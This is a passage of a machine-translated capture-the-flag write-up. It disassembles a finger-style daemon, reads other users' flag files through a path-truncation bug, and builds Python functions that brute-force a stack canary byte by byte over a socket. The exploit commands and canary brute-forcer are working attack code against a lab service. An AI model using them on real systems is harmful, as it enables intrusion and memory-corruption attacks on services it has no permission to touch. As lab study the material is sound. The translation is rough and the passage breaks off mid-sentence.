class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>C22 mov rdi, rax ; s .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>C25 call _memset .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>C2A mov edi, offset buf ; <span class="hljs-string"><span class="hljs-string">"User to query: "</span></span> .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>C2F mov eax, <span class="hljs-number"><span class="hljs-number">0</span></span> .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>C34 call _printf .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>C39 mov eax, [rbp+fd] .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>C3F mov edx, <span class="hljs-number"><span class="hljs-number">0</span></span>Fh ; n .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>C44 mov esi, offset buf ; <span class="hljs-string"><span class="hljs-string">"User to query: "</span></span> .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>C49 mov edi, eax ; fd .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>C4B call _write .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>C50 lea rcx, [rbp+buf] .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>C57 mov eax, [rbp+fd] .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>C5D mov edx, <span class="hljs-number"><span class="hljs-number">7</span></span>D0h ; nbytes .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>C62 mov rsi, rcx ; buf .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>C65 mov edi, eax ; fd .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>C67 call _read .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>C6C lea rax, [rbp+buf] .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>C73 mov esi, offset reject ; <span class="hljs-string"><span class="hljs-string">"\n"</span></span> .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>C78 mov rdi, rax ; s .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>C7B call _strcspn .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>C80 mov [rbp+rax+buf], <span class="hljs-number"><span class="hljs-number">0</span></span> .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>C88 mov eax, [rbp+fd] .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>C8E mov edx, <span class="hljs-number"><span class="hljs-number">0</span></span>Ch ; n .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>C93 mov esi, offset aChecking___ ; <span class="hljs-string"><span class="hljs-string">"Checking...\n"</span></span> .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>C98 mov edi, eax ; fd .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>C9A call _write .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>C9F lea rax, [rbp+<span class="hljs-keyword"><span class="hljs-keyword">file</span></span>] .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>CA6 mov edx, <span class="hljs-number"><span class="hljs-number">64</span></span>h ; n .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>CAB mov esi, <span class="hljs-number"><span class="hljs-number">0</span></span> ; c .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>CB0 mov rdi, rax ; s .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>CB3 call _memset .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>CB8 lea rax, [rbp+buf] .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>CBF mov edx, <span class="hljs-number"><span class="hljs-number">4</span></span> ; n .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>CC4 mov esi, offset s2 ; <span class="hljs-string"><span class="hljs-string">"root"</span></span> .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>CC9 mov rdi, rax ; s1 .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>CCC call _strncmp .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>CD1 test eax, eax .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>CD3 jnz short loc_400CF2 .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>CD5 lea rax, [rbp+<span class="hljs-keyword"><span class="hljs-keyword">file</span></span>] .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>CDC mov rcx, <span class="hljs-number"><span class="hljs-number">702E2</span></span>F746F6F722Fh .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>CE6 mov [rax], rcx .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>CE9 mov dword ptr [rax+<span class="hljs-number"><span class="hljs-number">8</span></span>], <span class="hljs-number"><span class="hljs-number">6E616</span></span>Ch .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>CF0 jmp short loc_400D1A .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>CF2 ; --------------------------------------------------------------------------- .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>CF2 .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>CF2 loc_400CF2: ; CODE XREF: query_user+<span class="hljs-number"><span class="hljs-number">14</span></span>D .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>CF2 lea rdx, [rbp+buf] .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>CF9 lea rax, [rbp+<span class="hljs-keyword"><span class="hljs-keyword">file</span></span>] .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>D00 mov rcx, rdx .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>D03 mov edx, offset aHomeS_plan ; <span class="hljs-string"><span class="hljs-string">"/home/%s/.plan"</span></span> .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>D08 mov esi, <span class="hljs-number"><span class="hljs-number">30</span></span> ; maxlen .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>D0D mov rdi, rax ; s .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>D10 mov eax, <span class="hljs-number"><span class="hljs-number">0</span></span> .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>D15 call _snprintf .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>D1A .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>D1A loc_400D1A: ; CODE XREF: query_user+<span class="hljs-number"><span class="hljs-number">16</span></span>A .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>D1A lea rax, [rbp+<span class="hljs-keyword"><span class="hljs-keyword">file</span></span>] .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>D21 mov rsi, rax .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>D24 mov edi, offset aPlan_locS ; <span class="hljs-string"><span class="hljs-string">"plan_loc [%s]\n"</span></span> .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>D29 mov eax, <span class="hljs-number"><span class="hljs-number">0</span></span> .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>D2E call _printf .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>D33 lea rax, [rbp+<span class="hljs-keyword"><span class="hljs-keyword">file</span></span>] .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>D3A mov esi, <span class="hljs-number"><span class="hljs-number">0</span></span> ; oflag .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>D3F mov rdi, rax ; <span class="hljs-keyword"><span class="hljs-keyword">file</span></span> .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>D42 mov eax, <span class="hljs-number"><span class="hljs-number">0</span></span> .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>D47 call _open .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>D4C mov dword ptr [rbp+file_cntx], eax .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>D52 cmp dword ptr [rbp+file_cntx], <span class="hljs-number"><span class="hljs-number">0</span></span>FFFFFFFFh .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>D59 jnz short loc_400D77 .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>D5B mov eax, [rbp+fd] .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>D61 mov edx, <span class="hljs-number"><span class="hljs-number">25</span></span>h ; n .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>D66 mov esi, offset aDonTKnowAnythi ; <span class="hljs-string"><span class="hljs-string">"Don't know anything about this user.\n"</span></span> .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>D6B mov edi, eax ; fd .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>D6D call _write .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>D72 jmp loc_400DF8 .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>D77 ; --------------------------------------------------------------------------- .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>D77 .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>D77 loc_400D77: ; CODE XREF: query_user+<span class="hljs-number"><span class="hljs-number">1</span></span>D3 .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>D77 lea rax, [rbp+var_4B0] .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>D7E mov edx, <span class="hljs-number"><span class="hljs-number">50</span></span>h ; n .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>D83 mov esi, <span class="hljs-number"><span class="hljs-number">0</span></span> ; c .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>D88 mov rdi, rax ; s .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>D8B call _memset .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>D90 lea rcx, [rbp+var_4B0] .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>D97 mov eax, dword ptr [rbp+file_cntx] .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>D9D mov edx, <span class="hljs-number"><span class="hljs-number">50</span></span>h ; nbytes .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>DA2 mov rsi, rcx ; buf .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>DA5 mov edi, eax ; fd .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>DA7 call _read .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>DAC mov dword ptr [rbp+file_cntx+<span class="hljs-number"><span class="hljs-number">4</span></span>], eax .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>DB2 lea rax, [rbp+var_4B0] .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>DB9 mov rsi, rax .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>DBC mov edi, offset aPlanFileS ; <span class="hljs-string"><span class="hljs-string">"plan file [%s]\n"</span></span> .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>DC1 mov eax, <span class="hljs-number"><span class="hljs-number">0</span></span> .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>DC6 call _printf .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>DCB mov eax, dword ptr [rbp+file_cntx+<span class="hljs-number"><span class="hljs-number">4</span></span>] .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>DD1 movsxd rdx, eax ; n .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>DD4 lea rcx, [rbp+var_4B0] .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>DDB mov eax, [rbp+fd] .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>DE1 mov rsi, rcx ; buf .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>DE4 mov edi, eax ; fd .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>DE6 call _write .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>DEB mov eax, dword ptr [rbp+file_cntx] .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>DF1 mov edi, eax ; fd .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>DF3 call _close .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>DF8 .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>DF8 loc_400DF8: ; CODE XREF: query_user+<span class="hljs-number"><span class="hljs-number">1</span></span>EC .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>DF8 mov eax, <span class="hljs-number"><span class="hljs-number">0</span></span> .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400</span></span>DFD mov rcx, [rbp+var_8] .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400E01</span></span> xor rcx, fs:<span class="hljs-number"><span class="hljs-number">28</span></span>h .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400E0</span></span>A jz short locret_400E11 .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400E0</span></span>C call ___stack_chk_fail .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400E11</span></span> ; --------------------------------------------------------------------------- .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400E11</span></span> .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400E11</span></span> locret_400E11: ; CODE XREF: query_user+<span class="hljs-number"><span class="hljs-number">284</span></span> .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400E11</span></span> leave .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400E12</span></span> retn .<span class="hljs-keyword"><span class="hljs-keyword">text</span></span>:<span class="hljs-number"><span class="hljs-number">0000000000400E12</span></span> query_user endp</code> </pre> <br></div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Here the most interesting is the function </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">snprintf</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , which forms the path to the file being opened, upon closer examination it can be seen that the final path is truncated to 30-1 characters. </font><font style="vertical-align: inherit;">Therefore, theoretically, we can again read any file:</font></font><br><br><pre> <code class="bash hljs">bob@baffle:~/binz$ python -c <span class="hljs-string"><span class="hljs-string">'print("///////charlie/flag.txt")'</span></span> | nc localhost 7979</code> </pre> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> And we get another flag: </font></font><br><blockquote><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Socket fd: 10 </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">User to query: Checking ... </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">FLAG {i_haz_sriracha_ice_cream} </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">---</font></font></blockquote><br><h3><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Flag 5 (vulnhub) </font></font></h3><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Perhaps the same method will turn out to pull the flag from another user: </font></font><br><br><pre> <code class="bash hljs">bob@baffle:~$ python -c <span class="hljs-string"><span class="hljs-string">'print("///////vulnhub/flag.txt")'</span></span> |nc localhost 7979</code> </pre> <br><blockquote><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Socket fd: 6 </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">User to query: Checking ... </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Sorry Mario. </font><font style="vertical-align: inherit;">The flag is in another castle. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">---</font></font></blockquote><br>  Did not work.<font style="vertical-align: inherit;"><font style="vertical-align: inherit;">We continue the search. </font><font style="vertical-align: inherit;">As in the previous case, the file has the same protection: </font></font><br><br><img src="https://habrastorage.org/files/336/bd1/faa/336bd1faae274ec1b13f9517a408c840.png"><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">However, there are some differences. </font><font style="vertical-align: inherit;">After a long search, bypassing the methods of </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">canaries</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , you can stumble upon 2 articles: </font></font><a href="http://phrack.org/issue/67/13.html"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">this</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> and </font></font><a href="http://vagmour.eu/persistence-1/"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">this</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font><font style="vertical-align: inherit;">After reading them, we understand that this is our case. </font><font style="vertical-align: inherit;">When sending different values ‚Äã‚Äãto this daemon, during debugging, you can notice one feature. </font><font style="vertical-align: inherit;">In case the entered string does not damage </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">the canary</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , the output looks like this:</font></font><br><br><div class="spoiler"> <b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Client side</font></font></b> <div class="spoiler_text"><blockquote> Socket fd: 407 <br> User to query: AA <br> Checking‚Ä¶ <br> Don't know anything about this user. <br> --- </blockquote><br></div></div><br><div class="spoiler"> <b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Server side</font></font></b> <div class="spoiler_text"><blockquote> + connection accepted <br> + back in parent <br> User to query: plan_loc [/home/AA/.plan] </blockquote><br></div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">However, when damage to </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">the canary</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> occurs </font><font style="vertical-align: inherit;">, the output changes to the following:</font></font><br><br><div class="spoiler"> <b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Client side</font></font></b> <div class="spoiler_text"><blockquote> Socket fd: 408 <br> User to query: AAA.....AAAA <br> Checking‚Ä¶ <br> Don't know anything about this user. <br></blockquote><br></div></div><br><div class="spoiler"> <b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Server side</font></font></b> <div class="spoiler_text"><blockquote> + connection accepted <br> + back in parent <br> User to query: plan_loc [/home/AAAAAAAAAAAAAAAAAAAAAAA] <br> *** stack smashing detected ***: ./ctfingerd terminated <br></blockquote><br></div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">As you can see, in the second case, the characters </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"---" are</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> not returned to the client </font><font style="vertical-align: inherit;">. </font><font style="vertical-align: inherit;">This can be used for brutfors canaries. </font><font style="vertical-align: inherit;">To iterate through using </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Python</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , for this we will prepare several functions. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">First you need a function that actually will, after sending the data, check whether the application has crashed or not:</font></font><br><br><pre> <code class="python hljs"><span class="hljs-comment"><span class="hljs-comment">#!/usr/bin/python2 import socket from time import sleep from struct import pack, unpack port = 7979 host = 'localhost' def isCrashed(data): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) s.send(data) sleep(0.2) req = s.recv(1024) s.shutdown(1) s.close() if '---' not in req: return True return False</span></span></code> </pre> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Need a function to search for the required displacement, it can of course set and constant, but a </font></font><s><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cool</font></font></s><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> dynamic:</font></font><br><br><pre> <code class="python hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">findCanaryOffset</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function">:</span></span> min_offset = <span class="hljs-number"><span class="hljs-number">0</span></span> max_offset = <span class="hljs-number"><span class="hljs-number">2000</span></span> cur_offset = getCurrentOffset(min_offset, max_offset) <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> (max_offset - min_offset) &gt; <span class="hljs-number"><span class="hljs-number">1</span></span>: print(<span class="hljs-string"><span class="hljs-string">'[*] Max Offset: %s Min Offset: %s'</span></span> % (max_offset, min_offset)) send_data = <span class="hljs-string"><span class="hljs-string">'A'</span></span> * cur_offset <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> isCrashed(send_data): max_offset = cur_offset <span class="hljs-keyword"><span class="hljs-keyword">else</span></span>: min_offset = cur_offset cur_offset = getCurrentOffset(min_offset, max_offset) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> min_offset</code> </pre> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Here we do not go over the forehead: </font></font><br><br><ul><li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> we take 2 extreme values ‚Äã‚Äãat which our service crashes and no; </font></font></li><li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> calculate the average between them and send it; </font></font></li><li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> then everything is simple, it has crumbled - it means a lot, if not - not enough </font></font></li></ul><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> For directly selecting the value of the canary, we use the following small function: </font></font><br><br><pre> <code class="python hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">findCanary</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(payload)</span></span></span><span class="hljs-function">:</span></span> canary = <span class="hljs-string"><span class="hljs-string">''</span></span> <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">8</span></span>): <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> byte <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">256</span></span>): char = chr(byte) data = payload + canary + char <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> <span class="hljs-keyword"><span class="hljs-keyword">not</span></span> isCrashed(data): canary += char print(<span class="hljs-string"><span class="hljs-string">'[+] Found Canary byte %d: %s'</span></span> % (i, char.encode(<span class="hljs-string"><span class="hljs-string">'hex'</span></span>))) <span class="hljs-keyword"><span class="hljs-keyword">break</span></span> print(<span class="hljs-string"><span class="hljs-string">'[+] Canary found: %s'</span></span> % (canary.encode(<span class="hljs-string"><span class="hljs-string">'hex'</span></span>))) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> canary</code> </pre> <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Which, incidentally, displays the intermediate values ‚Äã‚Äãfound. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: 